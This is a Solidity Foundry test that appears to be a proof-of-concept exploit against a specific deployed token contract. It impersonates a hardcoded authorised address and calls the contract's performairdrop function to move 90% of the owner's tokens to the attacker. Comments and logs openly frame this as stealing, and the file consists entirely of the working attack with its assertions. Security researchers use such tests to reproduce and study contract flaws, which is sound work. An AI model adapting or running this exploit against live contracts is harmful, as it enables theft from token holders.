pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

interface IMetaApes {
    function getOwner() external view returns (address);
    function performairdrop(address from, address[] calldata addresses, uint256[] calldata tokens) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0xd764457Fadd15B52089BeE2b3c38964C7dFf0B70;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate authorized address
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Store initial balance
        uint256 initialBalance = IERC20(TARGET).balanceOf(attacker);

        // Get the owner address
        address owner = IMetaApes(TARGET).getOwner();
        console.log("Owner address:", owner);

        // Check owner's balance
        uint256 ownerBalance = IERC20(TARGET).balanceOf(owner);
        console.log("Owner balance:", ownerBalance);

        // We'll try to steal a significant portion of owner's balance
        // Let's take 90% to ensure we get a lot but leave some for gas/etc
        uint256 stealAmount = ownerBalance * 9 / 10;

        // Prepare arrays for airdrop
        address[] memory recipients = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        recipients[0] = attacker;
        amounts[0] = stealAmount;

        // Impersonate the pre-authorized address 0x061648f51902321C353D193564b9C8C2F720557a
        address authorizedAddress = 0x061648f51902321C353D193564b9C8C2F720557a;
        vm.prank(authorizedAddress);

        // Call performairdrop to transfer from owner to ourselves
        (bool success, ) = TARGET.call(
            abi.encodeWithSignature(
                "performairdrop(address,address[],uint256[])",
                owner,  // from - the owner has tokens
                recipients,
                amounts
            )
        );

        require(success, "performairdrop call failed");

        // Check final balance
        uint256 finalBalance = IERC20(TARGET).balanceOf(attacker);

        // Verify we gained tokens
        assertGt(finalBalance, initialBalance, "Attacker balance should have increased");
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Tokens stolen:", finalBalance - initialBalance);
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

